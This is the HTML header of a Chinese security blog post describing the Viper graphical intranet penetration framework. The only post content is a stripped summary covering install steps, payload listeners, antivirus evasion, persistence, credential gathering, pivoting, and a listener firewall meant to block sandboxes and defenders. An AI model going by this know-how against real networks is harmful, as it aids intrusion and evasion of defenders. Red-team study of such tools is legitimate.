<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Viper渗透框架 | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Viper渗透框架"><meta name="application-name" content="Viper渗透框架"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Viper渗透框架"><meta property="og:url" content="https://hihopkc.github.io/posts/33922.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="Viper渗透框架Viper简介 Viper (炫彩蛇)   是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化。 集成杀软绕过，内网隧道,文件管理，命令行等基础功能。 当前已集成70+个模块，覆盖初始访问&amp;#x2F;持久化&amp;#x2F;权限提升&amp;#x2F;防御绕过&amp;amp;#x2F"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta name="description" content="Viper渗透框架Viper简介 Viper (炫彩蛇)   是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化。 集成杀软绕过，内网隧道,文件管理，命令行等基础功能。 当前已集成70+个模块，覆盖初始访问&amp;#x2F;持久化&amp;#x2F;权限提升&amp;#x2F;防御绕过&amp;amp;#x2F"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/33922"><link rel="preconnect" href="//npm.elemecdn.com"/><link rel="preconnect" href="//npm.onmicrosoft.cn"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://hihopkc.space/',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#3b70fc","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '嘻哈磕碜のBlogs',
  title: 'Viper渗透框架',
  postAI: 'true',
  pageFillDescription: 'Viper渗透框架, Viper简介, Viper安装, 脚本安装, 手动安装, Viper 登录, Viper 配置, 版本更新, 修改密码, 关闭x2F重启, 安装目录, Viper基本使用, 实时输出, 任务列表, 监听载荷, Stageless, Staged, 监听, 载荷, 监听防火墙, WebDelivery, 文件列表, 网络拓扑, 自动编排, 内网代理, 凭证列表, MSFCONSOLE, 权限操作, 权限信息, 文件管理, 内网路由, 端口转发, 传输协议, 命令终端, 删除权限, 主机操作, 主机信息, 开放端口, 已知漏洞, 修改备注, 删除主机, Viper 运行模块, 模块类别, 需要Session模块x2F无需Session模块, 过滤x2F查找x2F标注模块, 参数x2F说明, 运行x2F结果输出渗透框架简介炫彩蛇是一款图形化内网渗透工具将内网渗透过程中常用的战术及技术进行模块化及武器化集成杀软绕过内网隧道文件管理命令行等基础功能当前已集成个模块覆盖初始访问持久化权限提升防御绕过凭证访问信息收集横向移动等大类目标是帮助红队工程师提高攻击效率简化操作降低技术门槛支持在浏览器中运行原生且支持多人协作文档安装脚本安装提示输入密码后续登入需要此密码等待容器启动成功然后访问登录用户名登录密码为之前自己设置的密码手动安装准备一台系统的或虚拟机首次使用建议虚拟机安装推荐使用系统切换到用户执行命令安装安装或者设置安装目录生成安装目录并进入安装目录生成外网也可以将替换成设置登录密码写入密码到启动注意所有的命令必须在安装目录执行才会有效果登录等待系统启动访问登录服务器用户名密码查看密码查看端口默认端口为注意如果你使用部署请确认的防火墙开放了端口及后续监听需要的端口配置版本更新删除原有容器进入安装目录删除现有容器更新镜像新建并启动容器修改密码临时修改密码适用于需要在不重启的情况下修改密码更新后密码不会保留不允许使用默认密码替换为自定义密码密码且大于位进入镜像命令行执行修改密码命令持久化修改密码需要重启不允许使用默认密码替换为自定义密码密码且大于位进入安装目录设置密码写入密码到重新建立容器进入安装目录删除现有容器重启启动容器关闭重启临时关闭重新启动查看容器日志进入容器命令行安装目录通过挂载目录的方式持久化保存数据目录是的数据库文件是缓存数据库文件目录访问日志错误日志运行日志服务运行日志主服务运行日志接口服务日志目录存放用户下载上传的文件目录存放自定义模块目录用于生成自定义证书证书相关文件用于子配置文件用户可通过该配置文件自定义配置基本使用实时输出模块结果左侧显示主机模块参数结果等信息顶部支持搜索过滤重置过滤清空数据等操作平台日志右侧列表展示平台运行日志日志包含关键操作通知模块运行过程中的日志等信息顶部输入还支持多用户聊天任务列表任务列表标签会提示当前有多少任务正在运行可以点击任务对应的模块名称查看模块详细信息结果在实时输出里面查看面板会显示开始时间模块模块涉及的模块参数可以使用删除终止任务运行监听载荷又称为攻击载荷主要是用来建立目标机与攻击机稳定连接的可返回也可以进行程序注入等分为分阶段和不分阶段是一个二进制文件包含的所有必需部分以及所有必需的扩展全部捆绑在一起将完整的都编译在木马中体积庞大可直接独立地植入目标系统进行执行负责建立目标用户与攻击者之间的网络连接将执行传递到另一个阶段提供了传输器和传输体配对分阶段植入的技术由渗透攻击模块首先植入代码短小精悍且可靠的传输器载荷然后在运行传输器载荷时进一步下载传输体载荷并执行比如加载桌面控制等复杂的大型攻击载荷和就像入侵里面提到的大马和小马一样一个功能齐全一个只是构造一个连接或命令执行还需通过其他工具和脚本进行管理监听在原生的基础上增加了如下两项功能增加虚拟监听的概念在内网渗透的某些场景中如注入进程网正向我们只需要快捷的调用已有的监听配置不需要实际建立网络监听或网络连接虚拟监听和实际监听可相互转化新增监听虚拟监听是指将输入的监听配置选项存储在缓存中但不在服务器中建立实际运行的监听后续在运行模块传输协议时可以快速选择该监听配置虚拟监听在系统重启后仍然存在可用于鱼叉钓鱼持久化等场景真实的监听使用绿色图标表示虚拟监听使用灰色图标表示虚拟监听与实际监听可通过虚拟化实例化相互转换载荷快速生成可以点击监听中的生成载荷按钮快速生成载荷类型载荷为源码编译版本类型载荷为类型配置生成选择下方生成载荷按钮可以手动输入配置生成载荷选择自动监听选项在生成载荷完成后自动添加载荷所对应的监听监听防火墙每当客户端连接的监听时会根据客户端的网络地址来判断该是否允许连接监听允许时则正常传输载荷到客户端不允许时直接断开网络连接使用场景当使用鱼叉钓鱼时目标的地理位置为一个固定区域例如一个省监听防火墙可以屏蔽其他国外或其他省的连接监听红队模拟时如果可以根据需要屏蔽沙箱及网络测绘服务器连接监听如果地址不被允许连接监听则客户端通常为沙箱或者蓝队人员无法获取就无法判断服务器类型功能与的功能相同用于一句话加载常用于可以执行命令但是不方便上传文件的场景文件列表上传下载支持拖拽文件上传及点击上传点击下载自动使用浏览器下载查看支持直接预览文本文件及图片一句话下载当文件上传到服务器后默认提供网络下载功能界面中会提示各种版本的一句话下载网络拓扑汇总端口扫描历史上线信息当前信息及当前路由信息分析处理后生成网络拓扑图自动编排每当有新的权限上线时会自动按照顺序执行自动编排中已经配置好的模块时间间隔可以通过该参数设置每个模块执行的间隔时间避免短时间内执行多个模块导致报警或不稳定单一主机最大权限数量如果在自动编排中配置了会生成新的权限的模块比如上传并执行可执行文件则可能会出现死循环新的权限自动编排模块自动编排模块导致新的权限自动编排模块在配置了该参数之后如果系统判断单一主机同一个内网对应的权限数量大于配置数量则自动跳过自动编排模块内网代理的内网代理功能基于的代理模块集成而来将内网路由端口转发内网代理集中控制方便使用路由路径内网代理路由路径中可以查看所有主机的路由信息如果不存在对应路由则用网络直连表示路由列表查看所有中的路由端口转发查看所有的端口转发配置内网代理内网代理可以添加两种代理代理不支持代理使用的路由基于内网路由使用代理前确认配置了正确的路由凭证列表通过模块获取到的密码信息都会存储在此处也可以手动添加控制台常规操作原生复制操作支持智能提示支持终止切换到后台等操作支持选择文本自动复制到剪切板功能特殊命令如果出现命令行假死等问题可以通过输入进行重置操作权限操作权限信息查看点击生成的选择权限信息进程列表进程列表显示主机所有进程的信息和进程的信息文件管理通过点击权限选择文件管理进入主界面文件浏览文件管理功能类似的资源管理器上图功能依次为打开根目录打开默认目录打开上级目录目录栏前往刷新切换默认目录新建文件夹上传文件文件夹及磁盘支持双击进入目录栏支持输入指定目录后回车进入目录支持直接查看不大于的文件支持切换工作目录刷新当前目录新建文件夹上传文件下载文件点击上方新建文件夹按钮可在当前目录新建文件夹点击上传按钮可打开服务端文件管理器可以将服务器的文件上传到当前目录点击下载链接后台自动建立下载文件任务下载的文件会存储在文件管理中执行文件支持带参数执行可执行文件无回显修改文件可直接修改主机的文本类文件内网路由自动模式中会根据所在主机网卡掩码网关自动添加路由如果内网某个网卡有多个子网还可以通过手工输入的方式添加内网路由页面只显示当前添加的路由如果需要查看所有路由可以通过内网代理路由列表查看所有路由内网路由即是的功能具体原理可以参考如下链接端口转发权限操作端口转发正向转发正向转发是将的网络端口转发到所在内网的某某端口常用于连接内网的某服务如等如将所在主机的映射到的端口可以采用如下设置远程目标远程端口目标也可以选择内网其他主机反向转发反向转发是将内网的某某端口转发到的网络端口反向转发通常用于监听的回连假设你已经获取到内网的权限并建立了你通过一些途径了解到网段的其他机器无法直接连接互联网也就是无法直接连接你的此时你可以建立如下反向转发所有内网机器连接就相当于连接的端口你可以在端口建立监听并建立一个的虚拟监听此时可以使用虚拟监听作为载荷攻击内网其他机器即使其无法直接连接的端口转发功能基于的传输协议权限操作传输协议命令终端权限操作命令终端命令操作命令终端中可以直接输入命令还可以通过下方快捷键快速输入命令终端中默认使用增强命令行如果希望执行系统命令可以使用命令的方式删除权限权限操作删除权限可以使用删除权限功能关闭已获得的删除权限后无法撤销主机操作主机信息读取缓存重新请求每次打开窗口时会自动读取数据库中缓存的主机信息点击重新请求会在后台执行更新主机信息模块模块执行完成后自动将结果存储到数据库中主机信息网卡信息本地监听外网连接判断主机有哪些联网应用内网连接通常用于判断内网其他主机的地址及服务信息用于查找内网网段重要进程用于判断主机的杀软及远控软件运行情况所有连接所有进程开放端口数据来源展示的端口信息主要来源于三个模块端口扫描与服务识别端口扫描内网扫描可以在运行模块选择过滤信息收集类模块中找到这三个模块已知漏洞当前功能适配扫描模块已知功能当前适配的模块很少属于框架型功能修改备注主机操作修改备注或直接点击主机图标标签修改删除主机主机操作删除主机或在主机管理中批量删除常见问题为什么无法删除主机如果当前主机有正在活动的会自动新建主机信息为什么删除主机后仍然存在删除主机只会删除数据库中存储的主机相关信息并不会关闭对应运行模块模块类别资源部署初始访问执行持久化权限提升防御绕过凭证访问信息收集数据采集全网扫描被动扫描需要模块无需模块当在存在的行点击运行模块时显示所有可用的模块包括需要和无需的模块过滤查找标注模块的根据对模块进行分类可以通过选择栏进行过滤选择支持根据关键字搜索模块搜索功能会根据名称简介进行匹配参数说明左侧点击选择模块后右侧默认显示模块所需参数鼠标移到参数上方时自动显示参数说明右侧还可以切换到说明选项卡展示模块的更多信息适用权限是指模块可以在哪些权限下运行如上图表示模块可以在普通用户权限管理员权限权限下都可以运行图二表示模块只能在管理员及权限下运行运行结果输出输入参数后点击运行即可运行模块运行后切换到实时输出可以看到模块运行状态右侧通知列表会显示模块进入后台模块运行时输出的日志模块运行结束后提示等左侧展示模块的运行结果包括运行结束时间主机模块名称模块参数模块结果输出等如果模块运行时间较长可以在任务列表页面查看后台有哪些模块在运行点击删除按钮会手动终止模块后台运行',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-01 17:20:06',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>11</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>3</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 1.05rem;">工具使用<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/" itemprop="url">渗透框架</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">Viper渗透框架</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-05-31T07:59:55.000Z" title="发表于 2023-05-31 15:59:55">2023-05-31</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-08-01T09:20:06.682Z" title="更新于 2023-08-01 17:20:06">2023-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">4.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Viper渗透框架"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" 